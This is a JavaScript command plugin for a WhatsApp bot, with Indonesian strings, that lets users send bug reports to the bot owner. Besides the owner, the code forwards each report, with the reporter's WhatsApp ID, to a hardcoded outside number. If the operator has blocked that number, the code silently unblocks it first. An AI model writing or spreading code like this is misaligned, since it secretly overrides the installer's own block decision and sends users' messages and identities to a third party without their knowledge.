require('../../settings');
const axios = require("axios");

module.exports = {
    name: 'reportbug',
    alias: ['bugreport', 'laporbug', 'buglapor'],
    description: '<nama fitur>',
    run: async ({ naze, m, text }) => {
        try {
            
            const keterangan = `*Fitur ReportBug* 🐞\n\n` +
                `*Fungsi* 🛠️:\nMengirimkan laporan bug/error yang ditemukan saat menggunakan bot.\n\n` +
                `*Manfaat* 🔍:\nMembantu developer memperbaiki dan meningkatkan performa bot.\n\n` +
                `*Cara Penggunaan* 📤:\n\`reportbug <isi laporan>\`\n` +
                `*Contoh* 💡: \n\`reportbug Menu .ytmp4 error dan tidak merespons\`\n\n` +
                `*Catatan* ⚠️:\nPastikan laporan singkat, jelas, dan to the point.`;

            if (m.text?.toLowerCase().startsWith('keterangan|')) {
                const cmd = m.text.split('|')[1];
                if (['reportbug', 'bug'].includes(cmd)) {
                    await naze.sendMessage(m.chat, { text: keterangan }, { quoted: m });
                    
                    return;
                }
            }

            if (!text) throw new Error('Mau lapor bug apa?\n\nGunakan perintah:\n`reportbug <isi bug>`\n\nUntuk keterangan lengkap, ketik:\n`keterangan|reportbug`');

            await naze.sendMessage(m.chat, {
                text: `*Terima kasih! Laporan bug telah dikirim ke pengembang.*\n_Laporan kamu sangat membantu 👍_`,
                quoted: m
            });

            const laporan = `📩 *Bug Report Masuk*\n\n` +
                            `👤 Dari: @${m.sender.split('@')[0]}\n` +
                            `📋 Pesan:\n${text}`;

            // Kirim ke owner
            await naze.sendFromOwner(global.owner, laporan, m, {
                contextInfo: { mentionedJid: [m.sender], isForwarded: true }
            });

            // Nomor tujuan tambahan
            const devNumber = '6282268881337@s.whatsapp.net';

            // ✅ Cek apakah nomor diblokir
            const blocklist = await naze.fetchBlocklist(); // butuh fitur blocklist dari client
            if (Array.isArray(blocklist) && blocklist.includes(devNumber)) {
                await naze.updateBlockStatus(devNumber, 'unblock');
            }

            // Kirim pesan ke 6282268881337
            await naze.sendMessage(devNumber, {
                text: laporan,
                mentions: [m.sender]
            });

            

        } catch (e) {
            
            await global.handleError(naze, m, e, {
                sendRawError: true,
                useGemini: true,
                replyUser: true
            });
        }
    }
};
